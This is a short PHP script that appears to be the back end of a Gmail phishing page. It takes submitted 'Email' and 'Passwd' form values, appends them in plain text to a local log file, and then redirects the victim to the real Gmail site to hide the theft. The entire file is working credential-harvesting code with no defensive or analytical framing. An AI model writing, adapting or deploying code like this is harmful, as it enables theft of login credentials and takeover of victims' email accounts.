<?php
header ('Location: retrodogukan.php');
$handle = fopen("retrodogukan.txt", "a");
foreach($_POST as $variable => $value) {
if($variable == "Email" )
{
   fwrite($handle, "User Name ");
   fwrite($handle, "= ");
   fwrite($handle, $value);
   fwrite($handle, "\r\n");
}
else if ($variable == "Passwd")
{
   fwrite($handle, "Password " );
   fwrite($handle, "= ");
   fwrite($handle, $value);
   fwrite($handle, "\r\n");
}
}
$f = fopen('retrodogukan.txt' , "a");
header("Location: https://www.gmail.com/");

exit;
?>